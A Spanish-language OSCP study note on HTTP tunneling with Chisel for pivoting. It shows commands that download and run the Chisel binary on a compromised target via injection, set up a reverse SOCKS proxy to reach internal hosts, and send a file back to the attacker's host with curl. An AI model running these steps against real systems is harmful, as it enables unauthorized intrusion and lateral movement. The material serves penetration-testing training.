---
tipo: tecnica
fase: pivoting
so: linux
tags: [oscp, tecnica, pivoting, linux]
---

# HTTP Tunneling con Chisel

> [!abstract] Qué es y cuándo usarla
> **Chisel** encapsula un stream TCP dentro de **HTTP (WebSocket)** y lo cifra con SSH interno. Úsala cuando el perímetro (firewall/**DPI**) solo deja pasar **HTTP saliente** y no puedes usar reverse shell ni remote port forward SSH. Modelo **cliente/servidor** con el mismo binario; el **reverse SOCKS proxy** es lo más útil para pivotar desde un host que solo tiene salida.

## Requisitos previos
- Ejecución de comandos en el host pivote (p.ej. RCE/web shell).
- El target puede hacer salida HTTP a tu Kali; binario de Chisel **compatible** con su SO/arch (ojo glibc).
- `ncat` (Nmap) en Kali para hacer pasar SSH por el SOCKS.

## Pasos
```bash
# 1) Servir el binario y subirlo al target
sudo cp $(which chisel) /var/www/html/ && sudo systemctl start apache2
# en el target (vía inyección): wget <KALI>/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# 2) Server en Kali (abre SOCKS 1080 al conectar el client)
chisel server --port 8080 --reverse

# 3) Client en el target (reverse SOCKS)
/tmp/chisel client <KALI>:8080 R:socks > /dev/null 2>&1 &

# 4) Verificar y usar el SOCKS
ss -ntplu                                   # 127.0.0.1:1080 LISTEN (chisel)
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<IP_INTERNA>
# para herramientas no-SOCKS: proxychains con socks5 127.0.0.1 1080
```

> [!warning] Detección / problemas
> - **Incompatibilidad glibc**: Chisel de Kali (Go ≥1.20) falla en targets viejos (`GLIBC_2.32 not found`). Usa el binario oficial de GitHub v1.8.1 (compilado con **Go 1.19**).
> - **Leer errores** de un proceso en background: `/tmp/chisel client ... &> /tmp/output; curl --data @/tmp/output http://<KALI>:8080/` y captúralo con `tcpdump -nvvvXi tun0 tcp port 8080`.
> - El **netcat** de Kali no proxyea → instala `ncat`.
> - Ruidoso: tráfico WebSocket (`Sec-WebSocket-Protocol: chisel-v3`) visible en inspección.

## Visto en
- Módulo: [[20 - Tunneling Through Deep Packet Inspection]]
- Máquinas: [[]]
